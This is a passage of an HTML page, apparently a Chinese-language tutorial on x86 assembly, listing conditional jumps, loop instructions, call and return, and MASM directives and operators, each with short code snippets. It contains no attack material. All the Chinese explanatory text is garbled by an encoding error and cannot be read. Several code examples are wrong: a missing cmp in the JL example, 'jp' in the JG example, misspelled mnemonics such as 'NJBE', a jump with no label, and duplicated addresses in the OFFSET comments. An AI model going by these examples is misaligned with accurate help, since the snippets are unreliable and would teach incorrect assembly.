href="#JP-OPR-â€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºå¶è½¬ç§»-æµ‹è¯•æ¡ä»¶PF-1" class="headerlink" title="JP OPR â€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºå¶è½¬ç§», æµ‹è¯•æ¡ä»¶PF=1"></a>JP OPR â€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºå¶è½¬ç§», æµ‹è¯•æ¡ä»¶PF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNP-OPR-â€”â€”â€”â€”â€”â€”â€“ç»“æœä¸ºå¥‡è½¬ç§»-æµ‹è¯•æ¡ä»¶PF-0"><a href="#JNP-OPR-â€”â€”â€”â€”â€”â€”â€“ç»“æœä¸ºå¥‡è½¬ç§»-æµ‹è¯•æ¡ä»¶PF-0" class="headerlink" title="JNP OPR â€”â€”â€”â€”â€”â€”â€“ç»“æœä¸ºå¥‡è½¬ç§» , æµ‹è¯•æ¡ä»¶PF=0"></a>JNP OPR â€”â€”â€”â€”â€”â€”â€“ç»“æœä¸ºå¥‡è½¬ç§» , æµ‹è¯•æ¡ä»¶PF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JC-OPR-â€”â€”â€”â€”â€”â€”â€“-æœ‰è¿›ä½è½¬ç§»-æµ‹è¯•æ¡ä»¶CF-1"><a href="#JC-OPR-â€”â€”â€”â€”â€”â€”â€“-æœ‰è¿›ä½è½¬ç§»-æµ‹è¯•æ¡ä»¶CF-1" class="headerlink" title="JC OPR â€”â€”â€”â€”â€”â€”â€“ æœ‰è¿›ä½è½¬ç§» , æµ‹è¯•æ¡ä»¶CF=1"></a>JC OPR â€”â€”â€”â€”â€”â€”â€“ æœ‰è¿›ä½è½¬ç§» , æµ‹è¯•æ¡ä»¶CF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNC-OPR-â€”â€”â€”â€”â€”â€”â€“æ— è¿›ä½è½¬ç§»-æµ‹è¯•æ¡ä»¶CF-0"><a href="#JNC-OPR-â€”â€”â€”â€”â€”â€”â€“æ— è¿›ä½è½¬ç§»-æµ‹è¯•æ¡ä»¶CF-0" class="headerlink" title="JNC OPR â€”â€”â€”â€”â€”â€”â€“æ— è¿›ä½è½¬ç§»,  æµ‹è¯•æ¡ä»¶CF=0"></a>JNC OPR â€”â€”â€”â€”â€”â€”â€“æ— è¿›ä½è½¬ç§»,  æµ‹è¯•æ¡ä»¶CF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ— ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤-ä»¥ä¸‹æŒ‡ä»¤ç»å¸¸æ˜¯CMP-OPD-OPSåé¢çš„æŒ‡ä»¤æ ¹æ®æ¯”è¾ƒç»“æœæ¥å®ç°è½¬ç§»"><a href="#æ— ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤-ä»¥ä¸‹æŒ‡ä»¤ç»å¸¸æ˜¯CMP-OPD-OPSåé¢çš„æŒ‡ä»¤æ ¹æ®æ¯”è¾ƒç»“æœæ¥å®ç°è½¬ç§»" class="headerlink" title="æ— ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤(ä»¥ä¸‹æŒ‡ä»¤ç»å¸¸æ˜¯CMP OPD,OPSåé¢çš„æŒ‡ä»¤æ ¹æ®æ¯”è¾ƒç»“æœæ¥å®ç°è½¬ç§»)"></a>æ— ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤(ä»¥ä¸‹æŒ‡ä»¤ç»å¸¸æ˜¯CMP OPD,OPSåé¢çš„æŒ‡ä»¤æ ¹æ®æ¯”è¾ƒç»“æœæ¥å®ç°è½¬ç§»)</h3><h3 id="JB-æˆ–JNAE-opd-â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»"><a href="#JB-æˆ–JNAE-opd-â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JB(æˆ–JNAE) opd â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»"></a>JB(æˆ–JNAE) opd â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">å°äºè·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNB-æˆ–JAE-opdâ€”â€”â€”â€”â€”ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»"><a href="#JNB-æˆ–JAE-opdâ€”â€”â€”â€”â€”ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JNB(æˆ–JAE) opdâ€”â€”â€”â€”â€”ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»"></a>JNB(æˆ–JAE) opdâ€”â€”â€”â€”â€”ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ä¸å°äºè·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JA-æˆ–NJBE-OPDâ€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»"><a href="#JA-æˆ–NJBE-OPDâ€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JA(æˆ–NJBE) OPDâ€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»"></a>JA(æˆ–NJBE) OPDâ€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,+127cmp al,-128    ja/njbe L1;ä¸è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNA-æˆ–JBE-OPDâ€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»"><a href="#JNA-æˆ–JBE-OPDâ€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JNA(æˆ–JBE) OPDâ€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»"></a>JNA(æˆ–JBE) OPDâ€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,+127cmp al,-128    jna/jbe L1;è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å¸¦ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤"><a href="#å¸¦ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤" class="headerlink" title="å¸¦ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤"></a>å¸¦ç¬¦å·æ¯”è¾ƒæ¡ä»¶è½¬ç§»æŒ‡ä»¤</h3><h3 id="JL-æˆ–JNGE-â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»"><a href="#JL-æˆ–JNGE-â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JL(æˆ–JNGE) â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»"></a>JL(æˆ–JNGE) â€”â€”â€”â€”â€“å°äºæˆ–è€…ä¸å¤§äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5mov ax,6jl/jnge L1;è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNL-æˆ–JGE-â€”â€”â€”â€”â€“ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»"><a href="#JNL-æˆ–JGE-â€”â€”â€”â€”â€“ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JNL(æˆ–JGE)â€”â€”â€”â€”â€“ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»"></a>JNL(æˆ–JGE)â€”â€”â€”â€”â€“ä¸å°äºæˆ–è€…å¤§äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov edx,-1cmp edx,0    jnl/jge L1;ä¸è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JG-æˆ–NJLE-â€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»"><a href="#JG-æˆ–NJLE-â€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JG(æˆ–NJLE)â€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»"></a>JG(æˆ–NJLE)â€”â€”â€”â€”â€”å¤§äºæˆ–è€…ä¸å°äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5cmp ax,4jp/njle L1;å¤§äºåˆ™è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNG-æˆ–JLE-â€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»"><a href="#JNG-æˆ–JLE-â€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»" class="headerlink" title="JNG(æˆ–JLE)â€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»"></a>JNG(æˆ–JLE)â€”â€”â€”â€”â€”ä¸å¤§äºæˆ–è€…å°äºç­‰äºåˆ™è½¬ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ecx,0cmp ecx,0    jng/jle;è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JCXZ"><a href="#JCXZ" class="headerlink" title="JCXZ"></a>JCXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CX=0è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JECXZ"><a href="#JECXZ" class="headerlink" title="JECXZ"></a>JECXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ECX=0è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JRCXZ"><a href="#JRCXZ" class="headerlink" title="JRCXZ"></a>JRCXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">RCX=0è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="è°ƒç”¨å­ç¨‹åºä¸è¿”å›æŒ‡ä»¤"><a href="#è°ƒç”¨å­ç¨‹åºä¸è¿”å›æŒ‡ä»¤" class="headerlink" title="è°ƒç”¨å­ç¨‹åºä¸è¿”å›æŒ‡ä»¤"></a>è°ƒç”¨å­ç¨‹åºä¸è¿”å›æŒ‡ä»¤</h2><h3 id="CALL-å­ç¨‹åºè°ƒç”¨æŒ‡ä»¤"><a href="#CALL-å­ç¨‹åºè°ƒç”¨æŒ‡ä»¤" class="headerlink" title="CALL  å­ç¨‹åºè°ƒç”¨æŒ‡ä»¤"></a>CALL  å­ç¨‹åºè°ƒç”¨æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">call SumOf;è°ƒç”¨SumOfè¿‡ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="RET-å­ç¨‹åºè¿”å›æŒ‡ä»¤"><a href="#RET-å­ç¨‹åºè¿”å›æŒ‡ä»¤" class="headerlink" title="RET å­ç¨‹åºè¿”å›æŒ‡ä»¤"></a>RET å­ç¨‹åºè¿”å›æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SumOf proc    .    .    retSumOf endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ¡ä»¶å¾ªç¯æŒ‡ä»¤"><a href="#æ¡ä»¶å¾ªç¯æŒ‡ä»¤" class="headerlink" title="æ¡ä»¶å¾ªç¯æŒ‡ä»¤"></a>æ¡ä»¶å¾ªç¯æŒ‡ä»¤</h2><h3 id="LOOPâ€”â€”â€”-æŒ‰ECXè®¡ç®—å™¨å¾ªç¯"><a href="#LOOPâ€”â€”â€”-æŒ‰ECXè®¡ç®—å™¨å¾ªç¯" class="headerlink" title="LOOPâ€”â€”â€”-æŒ‰ECXè®¡ç®—å™¨å¾ªç¯"></a>LOOPâ€”â€”â€”-æŒ‰ECXè®¡ç®—å™¨å¾ªç¯</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">    mov ax,0    mov ecx,5L1:    inc ax    loop L1;æ¯æ¬¡å¾ªç¯axåŠ ä¸€ï¼Œå¾ªç¯5æ¬¡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LOOPZâ€”â€”â€”â€”ä¸ºé›¶è·³è½¬"><a href="#LOOPZâ€”â€”â€”â€”ä¸ºé›¶è·³è½¬" class="headerlink" title="LOOPZâ€”â€”â€”â€”ä¸ºé›¶è·³è½¬"></a>LOOPZâ€”â€”â€”â€”ä¸ºé›¶è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopz L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPNZâ€”â€”â€”â€”â€“éé›¶è·³è½¬"><a href="#LOOPNZâ€”â€”â€”â€”â€“éé›¶è·³è½¬" class="headerlink" title="LOOPNZâ€”â€”â€”â€”â€“éé›¶è·³è½¬"></a>LOOPNZâ€”â€”â€”â€”â€“éé›¶è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopnz L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPEâ€”â€”â€”â€”â€”â€”-ç›¸ç­‰è·³è½¬"><a href="#LOOPEâ€”â€”â€”â€”â€”â€”-ç›¸ç­‰è·³è½¬" class="headerlink" title="LOOPEâ€”â€”â€”â€”â€”â€”-ç›¸ç­‰è·³è½¬"></a>LOOPEâ€”â€”â€”â€”â€”â€”-ç›¸ç­‰è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loope L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPNEâ€”â€”â€”â€”â€”â€”-ä¸ç­‰è·³è½¬"><a href="#LOOPNEâ€”â€”â€”â€”â€”â€”-ä¸ç­‰è·³è½¬" class="headerlink" title="LOOPNEâ€”â€”â€”â€”â€”â€”-ä¸ç­‰è·³è½¬"></a>LOOPNEâ€”â€”â€”â€”â€”â€”-ä¸ç­‰è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopne L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="IF-ELSE-ELSEIF-ENDIF"><a href="#IF-ELSE-ELSEIF-ENDIF" class="headerlink" title=".IF .ELSE .ELSEIF .ENDIF"></a>.IF .ELSE .ELSEIF .ENDIF</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.IF conditionl    statements[.ELSELF condition2statements][ELSE statements].ENDIF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="REPEAT-WHILE"><a href="#REPEAT-WHILE" class="headerlink" title=".REPEAT .WHILE"></a>.REPEAT .WHILE</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.REPEAT     statements.UNTIL condition    .WHILE condition    statements.ENDW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å…¶å®ƒæŒ‡ä»¤"><a href="#å…¶å®ƒæŒ‡ä»¤" class="headerlink" title="å…¶å®ƒæŒ‡ä»¤"></a>å…¶å®ƒæŒ‡ä»¤</h2><h3 id="OFFSET-â€”â€”â€”â€”â€”â€”â€“-è¿”å›åç§»åœ°å€"><a href="#OFFSET-â€”â€”â€”â€”â€”â€”â€“-è¿”å›åç§»åœ°å€" class="headerlink" title="OFFSET â€”â€”â€”â€”â€”â€”â€“ è¿”å›åç§»åœ°å€"></a>OFFSET â€”â€”â€”â€”â€”â€”â€“ è¿”å›åç§»åœ°å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov esi,offset var1;  esi=00404000hmov esi,offset var2;  esi=00404000h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SEG-â€”â€”â€”â€”â€”â€”â€“-è¿”å›æ®µåœ°å€"><a href="#SEG-â€”â€”â€”â€”â€”â€”â€“-è¿”å›æ®µåœ°å€" class="headerlink" title="SEG  â€”â€”â€”â€”â€”â€”â€“ è¿”å›æ®µåœ°å€"></a>SEG  â€”â€”â€”â€”â€”â€”â€“ è¿”å›æ®µåœ°å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov esi,seg var1mov esi,seg var2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="EQU-â€”â€”â€”â€”â€”â€”â€“-ç­‰å€¼è¯­å¥"><a href="#EQU-â€”â€”â€”â€”â€”â€”â€“-ç­‰å€¼è¯­å¥" class="headerlink" title="EQU(=) â€”â€”â€”â€”â€”â€”â€“ ç­‰å€¼è¯­å¥"></a>EQU(=) â€”â€”â€”â€”â€”â€”â€“ ç­‰å€¼è¯­å¥</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">name EQU expressionname EQU symbolname EQU &lt;text&gt;    pressKey EQU &lt;"Press any key to continue...", 0&gt;matrix1 EQU 10 * 10matrix2 EQU &lt;10 * 10&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PURGE-â€”â€”â€”â€”â€”â€”â€“-è§£é™¤è¯­å¥"><a href="#PURGE-â€”â€”â€”â€”â€”â€”â€“-è§£é™¤è¯­å¥" class="headerlink" title="PURGE â€”â€”â€”â€”â€”â€”â€“ è§£é™¤è¯­å¥"></a>PURGE â€”â€”â€”â€”â€”â€”â€“ è§£é™¤è¯­å¥</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PURGEï¼Œæ ‡è¯†ç¬¦1ï¼Œæ ‡è¯†ç¬¦2ï¼Œ...ï¼Œæ ‡è¯†ç¬¦n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DUP-â€”â€”â€”â€”â€”â€”â€“-æ“ä½œæ•°å­—æ®µç”¨å¤åˆ¶æ“ä½œç¬¦"><a href="#DUP-â€”â€”â€”â€”â€”â€”â€“-æ“ä½œæ•°å­—æ®µç”¨å¤åˆ¶æ“ä½œç¬¦" class="headerlink" title="DUP  â€”â€”â€”â€”â€”â€”â€“ æ“ä½œæ•°å­—æ®µç”¨å¤åˆ¶æ“ä½œç¬¦"></a>DUP  â€”â€”â€”â€”â€”â€”â€“ æ“ä½œæ•°å­—æ®µç”¨å¤åˆ¶æ“ä½œç¬¦</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">db x dup();xæ˜¯é‡å¤çš„æ¬¡æ•°ï¼Œï¼ˆï¼‰é‡Œæ˜¯è¦é‡å¤çš„æ•°é€—å·åˆ†éš”str1 db 10 dup ('!@#') ;è¿™å°±æ˜¯åä¸ªï¼@#æ ¼å¼ï¼šdb é‡å¤çš„æ¬¡æ•° dup (é‡å¤çš„å†…å®¹)buf1 db 100 dup(?);å¼€è¾Ÿ100ä¸ªå­—èŠ‚çš„å†…å­˜åŒº<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SEGMENT-ENDS-â€”â€”â€”â€”â€”â€”â€“-æ®µå®šä¹‰æŒ‡ä»¤"><a href="#SEGMENT-ENDS-â€”â€”â€”â€”â€”â€”â€“-æ®µå®šä¹‰æŒ‡ä»¤" class="headerlink" title="SEGMENT,ENDS â€”â€”â€”â€”â€”â€”â€“ æ®µå®šä¹‰æŒ‡ä»¤"></a>SEGMENT,ENDS â€”â€”â€”â€”â€”â€”â€“ æ®µå®šä¹‰æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">segment_name SEGMENT ã€å®šä½ç±»å‹ã€‘ ã€ç»„åˆç±»å‹ã€‘ ã€ç±»åˆ«åã€‘Â·Â·Â·;here is your codesegment ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ASSUME-â€”â€”â€”â€”â€”â€”â€“-æ®µåœ°å€åˆ†é…æŒ‡ä»¤"><a href="#ASSUME-â€”â€”â€”â€”â€”â€”â€“-æ®µåœ°å€åˆ†é…æŒ‡ä»¤" class="headerlink" title="ASSUME â€”â€”â€”â€”â€”â€”â€“ æ®µåœ°å€åˆ†é…æŒ‡ä»¤"></a>ASSUME â€”â€”â€”â€”â€”â€”â€“ æ®µåœ°å€åˆ†é…æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.dataã€€ã€€.........codeã€€ã€€........ã€€ã€€assume cs:code,ds:datastart: .......ã€€ã€€mov ax,dataã€€ã€€mov ds,axã€€ã€€...endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ORG-â€”â€”â€”â€”â€”â€”â€“-èµ·å§‹åç§»åœ°å€è®¾ç½®æŒ‡ä»¤"><a href="#ORG-â€”â€”â€”â€”â€”â€”â€“-èµ·å§‹åç§»åœ°å€è®¾ç½®æŒ‡ä»¤" class="headerlink" title="ORG  â€”â€”â€”â€”â€”â€”â€“ èµ·å§‹åç§»åœ°å€è®¾ç½®æŒ‡ä»¤"></a>ORG  â€”â€”â€”â€”â€”â€”â€“ èµ·å§‹åç§»åœ°å€è®¾ç½®æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ORG 0000HAJMP MAINORG 0030H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="â€”â€”â€”â€”â€”â€”â€“åœ°å€è®¡æ•°å™¨çš„å½“å‰å€¼"><a href="#â€”â€”â€”â€”â€”â€”â€“åœ°å€è®¡æ•°å™¨çš„å½“å‰å€¼" class="headerlink" title="$   â€”â€”â€”â€”â€”â€”â€“åœ°å€è®¡æ•°å™¨çš„å½“å‰å€¼"></a>$   â€”â€”â€”â€”â€”â€”â€“åœ°å€è®¡æ•°å™¨çš„å½“å‰å€¼</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ä¾‹å¦‚JNE+6ï¼Œèƒ½å¼•ç”¨åœ°å€è®¡æ•°å™¨çš„å€¼ï¼Œæ¯æ¬¡å¼•ç”¨ä¼šä½¿åœ°å€è®¡æ•°å™¨çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œåœ°å€è®¡æ•°å™¨å³å½“å‰æŒ‡ä»¤çš„åç§»åœ°å€ã€‚è¯¥æŒ‡ä»¤çš„è½¬å‘åœ°å€å³JNEæŒ‡ä»¤çš„é¦–åœ°å€åŠ 6ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PROCï¼ŒENDP-â€”â€”â€”â€”â€”â€”â€“-è¿‡ç¨‹å®šä¹‰è¯­å¥"><a href="#PROCï¼ŒENDP-â€”â€”â€”â€”â€”â€”â€“-è¿‡ç¨‹å®šä¹‰è¯­å¥" class="headerlink" title="PROCï¼ŒENDP â€”â€”â€”â€”â€”â€”â€“ è¿‡ç¨‹å®šä¹‰è¯­å¥"></a>PROCï¼ŒENDP â€”â€”â€”â€”â€”â€”â€“ è¿‡ç¨‹å®šä¹‰è¯­å¥</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SumOf proc    .    .    .    retSumOf endp;è¿™æ˜¯ä¸€ä¸ªè¿‡ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="NAMEï¼ŒTITLEï¼ŒEND-â€”â€”â€”â€”â€”â€”â€“-ç¨‹åºå¼€å§‹ç»“æŸè¯­å¥"><a href="#NAMEï¼ŒTITLEï¼ŒEND-â€”â€”â€”â€”â€”â€”â€“-ç¨‹åºå¼€å§‹ç»“æŸè¯­å¥" class="headerlink" title="NAMEï¼ŒTITLEï¼ŒEND â€”â€”â€”â€”â€”â€”â€“ ç¨‹åºå¼€å§‹ç»“æŸè¯­å¥"></a>NAMEï¼ŒTITLEï¼ŒEND â€”â€”â€”â€”â€”â€”â€“ ç¨‹åºå¼€å§‹ç»“æŸè¯­å¥</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MACROï¼ŒENDM-â€”â€”â€”â€”â€”â€”â€“å®å®šä¹‰æŒ‡ä»¤"><a href="#MACROï¼ŒENDM-â€”â€”â€”â€”â€”â€”â€“å®å®šä¹‰æŒ‡ä»¤" class="headerlink" title="MACROï¼ŒENDM  â€”â€”â€”â€”â€”â€”â€“å®å®šä¹‰æŒ‡ä»¤"></a>MACROï¼ŒENDM  â€”â€”â€”â€”â€”â€”â€“å®å®šä¹‰æŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mPutchar MACRO char    push eax    mov al,char    call WriteChar    pop eax    ENDM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XLAT-ï¼ˆTRANSLATEï¼‰-â€”â€”â€”â€”â€”â€”â€“-æ¢ç æŒ‡ä»¤â€”"><a href="#XLAT-ï¼ˆTRANSLATEï¼‰-â€”â€”â€”â€”â€”â€”â€“-æ¢ç æŒ‡ä»¤â€”" class="headerlink" title="XLAT  ï¼ˆTRANSLATEï¼‰ â€”â€”â€”â€”â€”â€”â€“ æ¢ç æŒ‡ä»¤â€”-"></a>XLAT  ï¼ˆTRANSLATEï¼‰ â€”â€”â€”â€”â€”â€”â€“ æ¢ç æŒ‡ä»¤â€”-</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ALIGN-â€”â€”â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤"><a href="#ALIGN-â€”â€”â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤" class="headerlink" title="ALIGN â€”â€”â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤"></a>ALIGN â€”â€”â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte ?; 00404000hALIGN 2var2 byte ?; 00404002<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PTR-â€”â€”â€”â€”â€”â€”â€”-è¿ç®—ç¬¦"><a href="#PTR-â€”â€”â€”â€”â€”â€”â€”-è¿ç®—ç¬¦" class="headerlink" title="PTR â€”â€”â€”â€”â€”â€”â€”-è¿ç®—ç¬¦"></a>PTR â€”â€”â€”â€”â€”â€”â€”-è¿ç®—ç¬¦</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var dword 12345678hmov ax,word ptr var; å°†ä½16ä½(5678)é€å…¥ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TYPE"><a href="#TYPE" class="headerlink" title="TYPE"></a>TYPE</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word ?var2 byte ?; word,byteéƒ½æ˜¯type,åˆ†åˆ«ä»£è¡¨2,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LENGTHOF-â€”â€”â€”â€”â€“è¿ç®—ç¬¦"><a href="#LENGTHOF-â€”â€”â€”â€”â€“è¿ç®—ç¬¦" class="headerlink" title="LENGTHOF â€”â€”â€”â€”â€“è¿ç®—ç¬¦"></a>LENGTHOF â€”â€”â€”â€”â€“è¿ç®—ç¬¦</h3><pre class="line-numbers language-c++" data-language="c++"><code 